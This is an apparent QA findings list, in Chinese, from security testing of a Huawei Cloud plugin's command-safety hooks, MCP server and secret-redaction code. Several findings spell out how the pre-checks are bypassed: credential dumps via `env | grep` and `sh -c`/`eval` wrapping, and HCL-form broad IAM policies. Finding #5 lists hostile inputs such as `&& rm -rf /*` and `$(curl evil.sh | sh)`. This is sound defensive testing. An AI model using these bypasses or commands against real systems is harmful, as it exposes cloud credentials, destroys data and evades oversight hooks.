# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-09-20-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：`2026-09-20 05:40`（北京时间）
> **被测版本**：`v1.1.5`（npm latest 正式版，gitHead `e7ed6f66`）
> **本清单是统一提单脚本的解析输入**：`scripts/file_issue.py` 硬编码解析标题与「根因」字段，格式严格遵循。

---

## #1【P0】D4-2 凭证 env 打印拦截未覆盖 `HW_` 前缀

- **现象**：v1.1.5 复测——`printenv HW_SECRET_KEY` 返回 `deny risk=credential`（已修复），但 `env | grep HW_ACCESS_KEY`、`env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。对照 `env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确 `deny`。
- **断言**：`env | grep HW_ACCESS_KEY` 应返回 `deny`（识别华为云凭证 env 并拦截）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398-399` env-dump 关键字正则 `/HUAWEICLOUD|HWC_|HCLOUD|OS_/i` 仍缺 `HW_` 前缀；新增规则只覆盖 `$HW_*` 引用与 `printenv HW_*`，未覆盖 `env | grep HW_*` 管道形态。
- **影响**：可借 `env | grep HW_ACCESS_KEY` 提取 AK/SK 明文，凭证红线缺口。
- **证据**：`evidence/D4-2/stdout.log`（classify-probe）
- **状态**：历史查重命中 #652-1 等，不重复提单

## #2【P0】D4-16 env-dump 规则被 shell 包裹穿透

- **现象**：v1.1.5 复测——`sh -c "hcloud ecs DeleteServer --force"`、`sh -c "cat ~/.config/huaweicloud/credentials.json"` 均 `deny`（shell 解包已生效）；但 `sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`bash -c "printenv HUAWEICLOUD_SDK_AK"`、`eval "env | grep HUAWEICLOUD_ACCESS_KEY"` 仍 `allow risk=not_huaweicloud`。对照裸命令 `env | grep HUAWEICLOUD_ACCESS_KEY` 正确 `deny`。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应返回 `deny`（解开 shell 包裹后识别内层 env-dump）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398` env-dump 检测 `(^|\s)(env|printenv|...)` 依赖词边界，`sh -c "..."` 使内层 `env` 前为引号而非词边界；v1.1.5 的 `stripExecutable` 解包只作用于 hcloud 参数分类，未回溯到 env-dump 文本规则。
- **影响**：shell 包裹仍可绕过 env-dump 预检。
- **证据**：`evidence/D4-16/stdout.log`（classify + wrap-probe）
- **状态**：历史查重命中 #652-2，不重复提单

## #3【P0】D4-21 hook_check_artifacts 未拦截 HCL 形态 broad IAM 制品

- **现象**：v1.1.5 复测——`evaluateArtifacts` 对 HCL `resource "huaweicloud_iam_policy" ... statement { effect="Allow" actions = ["*"] resources=["*"] }` 返回 `decision=allow`、findings 空；JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:179,196`（规则 `hwc-iam-admin-policy`）regex 只覆盖 JSON 形态，未覆盖 HCL 小写 `effect="Allow"`、`actions = ["*"]` 形态。
- **影响**：Terraform IaC broad IAM 绕过制品预检。
- **证据**：`evidence/D4-21/stdout.log`（hook + hcl-probe）
- **状态**：历史查重命中 #652-3/#651，不重复提单

## #4【P1】D9-2 JSON-RPC 未知 tool 错误码未区分 -32602

- **现象**：v1.1.5 复测——未知 method 正确返回 `{"code":-32601}`；但 `tools/call` 未知 tool 仍返回 `{"code":-32603,"message":"Unknown tool"}`（应 `-32602` Invalid params）。
- **断言**：未知 method 应返回 `-32601`；未知 tool 应返回 `-32602`。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:169` 对 `dispatch` 异常仍 `code: -32603` 兜底；`mcp-protocol.mjs` 的 `-32601` 修复只覆盖「未知 method」，未给「未知 tool」异常携带可区分的 `-32602`。
- **影响**：MCP 客户端无法区分「工具不存在」(-32602) 与「内部错误」(-32603)。
- **证据**：`evidence/D9-2/stdout.log`（protocol-probe）
- **状态**：历史查重命中 #652-4/#638，不重复提单

## #5【P1】D4-17 hook 模糊输入 fail-open（默认放行）

- **现象**：v1.1.5 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` —— `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无规则命中时默认 `allow`。
- **影响**：无法解析/规则未命中的命令与制品在预检阶段被放行（fail-open）。
- **证据**：`evidence/D4-17/stdout.log`（supplement-probe）
- **状态**：历史查重命中 #679/#674/#673，不重复提单

## #6【P1】D10-3 serviceCatalog 中文意图路由缺失（21.4% 准确率，D3-S5/S6/S7 同根因）

- **现象**：v1.1.5 复测——`eval/harness/run-eval.mjs` 对 15 条中文评测集 HIT=3 MISS=11 N/A=1（21.4%）：EXP-E06(DCS)/E09(CCE)/E15(代金券) 命中，E01~E05/E07/E10~E14 回退 `Run hcloud --help`。新增场景用例同根因复现：D3-S5「物联网+时序+前端托管」→ 无命中；D3-S6「部署 Python 函数定时执行」→ 无命中（FunctionGraph 未路由）；D3-S7「带 MySQL 的 Web 应用」→ 仅命中 RDS（`MySQL` 关键字），部署目标（sandbox/ECS）未命中。
- **断言**：`serviceCatalog` 中文意图应命中对应服务（评测级准确率 ≥90%）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1778-1908` `serviceCatalog` 的 `routeMap` —— 23 条路由仅 sandbox 与 voucher 含 CJK 关键字，其余仅英文；中文意图无法命中 → 回退 `Run hcloud --help`。
- **影响**：中文用户意图在服务发现/路由环节大面积未命中（21.4% << 90%），并导致复合意图场景（S5/S6/S7）多路命中/分层推荐失效。
- **证据**：`evidence/D10-3/stdout.log`（routing + eval-harness）+ `evidence/D3-S5/stdout.log` + `evidence/D3-S6/stdout.log` + `evidence/D3-S7/stdout.log`
- **状态**：历史查重命中 #689/#683/#674，不重复提单

## #7【P1】D4-27 redactSecrets/redactOutput 字符串路径脱敏缺口（裸 token / admin-pass 变体）

- **现象**：v1.1.5 直调复测 5 项断言 2 PASS / 3 FAIL——对象路径 `redactSecrets({token:...})` 与 `redactOutput(JSON)` 正确脱敏；但字符串路径 `redactSecrets('token=T0K3N_...')` 泄漏裸 `token=`；`--admin-pass=AdminP@ss_...`（连字符变体）未脱敏；`redactOutput` 非 JSON 回退同源泄漏 `token=`。
- **断言**：`redactSecrets`（字符串/对象）与 `redactOutput`（JSON/非 JSON）两条路径对 AK/SK/token/password/adminPass/secret_key 均无明文残留。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:42` `redactString` key=value 正则白名单缺裸 `token` 关键字；`adminPass` 仅字面 camelCase，未覆盖 `admin_pass`/`admin-pass` 变体（`safety/policy.json` secretKeyNamePatterns 含 `token` 但字符串路径未同步）。
- **影响**：redactSecrets 字符串路径与 redactOutput 非 JSON 回退对 `token=`/`admin-pass` 形态明文泄漏。
- **证据**：`evidence/D4-27/stdout.log`（D4-27-probe）
- **状态**：历史查重命中 #726（裸 token 关键字未脱敏），不重复提单

## #8【P2】D4-25 Python hook 写操作遥测分类误判为 cli:invoke

- **现象**：v1.1.5 实测 `hooks/huaweicloud-safety.py` `record_cli_event`——只读 `hcloud ecs ListServersDetails` → `cli:read`（正确）；写 `hcloud vpc CreateVpc` → `cli:invoke`（应为 `cli:write`）；`hcloud help` → `cli:invoke`（正确）；非 hcloud `npm install` → 不落事件（提前 return）。
- **断言**：写操作 `hcloud <svc> <Create/Delete/Update...>` 应分类为 `cli:write`。
- **根因**：`hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE = re.compile(r"(^|[A-Za-z0-9])(Create|Delete|...)\w*", re.I)` —— 前置捕获组要求写操作前缀前是「行首或字母数字」，但实际 `hcloud vpc CreateVpc` 中操作名 `CreateVpc` 前是空格（服务名 `vpc`），故永不匹配；应改用 `\b` 词边界（对照 `READ_OPERATION_RE` 用 `\b` 正确工作）。
- **影响**：Python hook 端写操作遥测被误分类，`hook-events.jsonl` 的 `cli:write` 事件缺失，遥测/审计失真（Node 端 `classifyHcloudArgs` 无此问题）。
- **证据**：`evidence/D4-25/stdout.log`（new-safety-probe）
- **状态**：新缺陷，待提单

## #9【P2】D4-26 findings.evidence 脱敏未覆盖 JSON 带引号 key（明文 secret_key/adminPass 泄漏）

- **现象**：v1.1.5 直调 `risk-rule-engine.evaluateArtifacts`——触发 `hwc-iam-admin-policy`（deny）的 JSON 制品含 `"secret_key":"SKSECRETVALUE9"`、`"adminPass":"MyP@ss12345"` 时，`findings[].evidence` 原样保留明文（未 `<redacted>`）。
- **断言**：findings.evidence 中 AK/SK/token/password 均被 `<redacted>` 替换，不泄露明文。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19` `redactEvidence` 的捕获组要求「键名 + 可空白 + `[:=]`」紧邻（如 `adminPass=xxx`），JSON 形态 `"adminPass":"xxx"` 键与 `:` 之间隔着 `"`，正则不匹配 → 明文残留（与 safety-policy.mjs `redactString` 同缺陷类，不同文件）。
- **影响**：制品/部署计划预检触发的 findings.evidence 在 JSON 形态下泄漏明文密码/AK/SK。
- **证据**：`evidence/D4-26/stdout.log`（new-safety-probe）
- **状态**：新缺陷，待提单

## #10【P2】D1-68 区域环境变量优先级与用例契约漂移（SPEC-MISMATCH）

- **现象**：用例 D1-68 契约称「HUAWEICLOUD_REGION 优先于 HW_REGION 作为默认 region」，实现 `auth/credentials.mjs` 实际为 `HW_REGION || HUAWEICLOUD_REGION`（HW_REGION 优先）。实测 `getServiceIcon` 离线分支（ICONS_OFFLINE=1 → source=snapshot）正常。
- **断言**：契约「HUAWEICLOUD_REGION 优先于 HW_REGION」与实际实现「HW_REGION 优先」不一致（漂移点）。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:133,261,284` —— `let region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''` 及 server.env/server.environment 两处同构，均将 `HW_REGION` 置于 `HUAWEICLOUD_REGION` 之前。
- **影响**：当两环境变量同时设置时，`HW_REGION` 生效而非 `HUAWEICLOUD_REGION`，与测试用例/文档契约相反（可能为用例文案与实现描述不一致，非功能性缺陷，需维护者确认哪侧为准）。
- **证据**：`evidence/D1-68/stdout.log`（new-env-probe）
- **状态**：新缺陷，待提单

---